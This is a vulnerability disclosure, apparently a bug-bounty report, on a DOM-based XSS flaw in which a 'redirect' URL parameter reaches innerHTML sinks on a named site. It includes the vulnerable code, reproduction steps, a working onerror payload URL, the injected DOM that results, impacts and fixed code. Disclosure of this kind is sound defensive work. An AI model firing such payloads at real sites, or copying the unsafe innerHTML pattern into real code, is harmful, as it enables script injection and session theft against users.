# Title
DOM-based Cross-Site Scripting (XSS) via Unsanitized `redirect` Parameter in Search Tracking and Heading

# Vulnerability Type
DOM-based Cross-Site Scripting (XSS)

# Summary
The application is vulnerable to DOM-based XSS through the `redirect` URL query parameter. When the page loads, JavaScript extracts this parameter and injects it into multiple DOM elements, including the search heading and a hidden image tracker container, using the unsafe `innerHTML` property. Because the input is not sanitized or HTML-encoded, an attacker can break out of the attribute context and inject malicious HTML/JavaScript, resulting in arbitrary script execution in the victim's browser.

**Vulnerable Code Analysis (Source to Sink):**

- **Source (Tainted Data):** The application extracts user input from the URL query string.
```js
var params = new URLSearchParams(window.location.search);
var redirectVal = params.get('redirect');
```

- **Sink 1 (Execution Point - Heading):** The input is concatenated directly into a DOM element's HTML.
```js
var headingEl = document.getElementById('searchHeading');
headingEl.innerHTML = 'Search results for: ' + redirectVal;
```

- **Sink 2 (Execution Point - Hidden Tracker):** The input is concatenated into an `<img>` tag's `src` attribute. The payload breaks out of the quote, closes the tag, and injects a new image with an event handler.
```js
trackerContainer.innerHTML = '<img src="/useruploads/resources/images/tracker.gif?searchTerms=' + redirectVal + '">';
```

# Vulnerable Endpoint
`https://kzlabs.store/subdomains/censys/`

# Steps to Reproduce
1. Navigate to the vulnerable Censys subdomain: `https://kzlabs.store/subdomains/censys/`
2. Append the malicious payload to the `redirect` parameter in the URL.
3. Load the following crafted URL:  
    `https://kzlabs.store/subdomains/censys/?redirect=rix4uni%27%22%3C%3E%3Cimg%20src=x%20onerror=confirm(1)%3E`
4. Upon page load, the application processes the parameter, and the injected `<img>` tag's `onerror` event fires.
5. Observe the `confirm(1)` alert box executing.

# Payload Used
**URL Query Parameter Payload:**
```text
?redirect=rix4uni%27%22%3C%3E%3Cimg%20src=x%20onerror=confirm(1)%3E
```
# Proof of Concept
<img width="1920" height="1041" alt="1" src="https://github.com/user-attachments/assets/8edf9de8-b3fd-45f9-b2d4-14595b4df47f" />
<img width="1917" height="620" alt="2" src="https://github.com/user-attachments/assets/9240e3e8-6777-4e7e-b54f-657ee31f3c88" />
<img width="1920" height="1037" alt="3" src="https://github.com/user-attachments/assets/ce270f63-efba-4297-9e69-98be9cb1a063" />


**Resulting DOM structure (Hidden Tracker Sink):**
```html
<div id="trackerContainer" style="display: none;">
    <img src="/useruploads/resources/images/tracker.gif?searchTerms=rix4uni'"><><img src=x onerror=confirm(1)>">
</div>
```
# Impact
- **Arbitrary JavaScript Execution:** An attacker can execute malicious scripts in the context of the victim's browser session by tricking them into clicking a crafted link.
- **Account Takeover:** Attackers can steal session cookies or local storage tokens, allowing them to impersonate the victim.
- **Data Exfiltration:** Malicious scripts can read sensitive data (like user details or search history) and send it to an attacker-controlled server.
- **Phishing:** Attackers can modify the DOM to display fake login forms or overlays to steal credentials.
# Recommendation for fix
The vulnerability occurs because user-controllable data from the URL is inserted into the DOM using `.innerHTML`.

1. **Use Safe Text Insertion:** For the `searchHeading`, use `.textContent` instead of `.innerHTML` to ensure the user input is treated as plain text and not parsed as HTML.
2. **Use Safe DOM APIs:** For the hidden tracker, do not construct HTML strings with user input. Use `document.createElement('img')` and assign the sanitized value to the `src` property.
3. **Encode URL Parameters:** When appending user input to a URL (like the `src` of the tracker), use `encodeURIComponent()` to ensure special characters do not break out of the URL context.

**Secure Code Example:**
```js
// Fix for Heading
if (headingEl) {
    headingEl.style.display = 'block';
    headingEl.textContent = 'Search results for: ' + redirectVal; // SAFE
}

// Fix for Tracker
var trackerContainer = document.getElementById('trackerContainer');
if (!trackerContainer) {
    trackerContainer = document.createElement('div');
    trackerContainer.id = 'trackerContainer';
    trackerContainer.style.display = 'none';
    document.body.appendChild(trackerContainer);
}
// Create the image element safely
var img = document.createElement('img');
img.src = '/useruploads/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(redirectVal); // SAFE
trackerContainer.innerHTML = ''; // Clear previous
trackerContainer.appendChild(img);
```
